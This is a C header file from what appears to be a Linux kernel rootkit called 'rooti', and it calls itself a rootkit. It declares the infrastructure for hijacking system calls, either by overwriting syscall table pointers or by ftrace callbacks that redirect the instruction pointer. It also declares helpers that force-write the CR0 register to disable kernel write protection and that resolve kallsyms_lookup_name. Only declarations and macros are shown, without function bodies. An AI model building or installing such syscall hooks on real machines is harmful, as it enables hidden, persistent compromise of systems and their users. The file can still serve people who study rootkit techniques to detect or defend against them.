#ifndef _ROOTI_HOOKING_H
#define _ROOTI_HOOKING_H

#include <linux/ftrace.h>

/*
    Different methods of syscall hooking supported by this rootkit. The macro ROOTI_HOOKING_METHOD defined below
    is meant to be set euqal to one these options, and it indicates the chosen hooking method.
*/
#define ROOTI_METHOD_TABLE_HIJACKING 0  // Classic method of overriding the pointer in the syscall table, works on older kernels
#define ROOTI_METHOD_FTRACE 1           // Intercepting syscalls by registering an ftrace callback to handlers and modifying IP register

#define ROOTI_HOOKING_METHOD ROOTI_METHOD_FTRACE

// On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'.
#ifdef CONFIG_X86_64
#define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
#else
#define ROOTI_SYSCALL_NAME(name) (name)
#endif

// Shorthand for initializing syscall hook objects
#define ROOTI_HOOK(_name, _hook, _orig) \
{ \
    .name = ROOTI_SYSCALL_NAME(_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

/*
    Represents a syscall hook, extra members are defined for different types of hooking methods but
    the first three members are always defined and used for specifying the desired syscall, providing the hook function
    and for accessing the original syscall handler for use in the hook.
*/ 
struct rooti_syscall_hook {
    const char *name;      // hooked syscall name
    void *func;            // pointer to hook function
    void *orig;            // pointer to the original function
    unsigned long addr;    // memory address of the original function

#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
    unsigned int idx;      // index of the syscall in the kernel syscall table
#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
    struct ftrace_ops ops; // ftrace configuration
#endif
};

extern unsigned long (*__kallsyms_lookup_name)(const char *name);

int rooti_hooking_init(void);
int rooti_install_hook(struct rooti_syscall_hook *hook);
int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count);
void rooti_uninstall_hook(struct rooti_syscall_hook *hook);
void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);

inline void rooti_force_write_cr0(unsigned long val);
inline void rooti_unprotect_memory(void);
inline void rooti_protect_memory(void);

#endif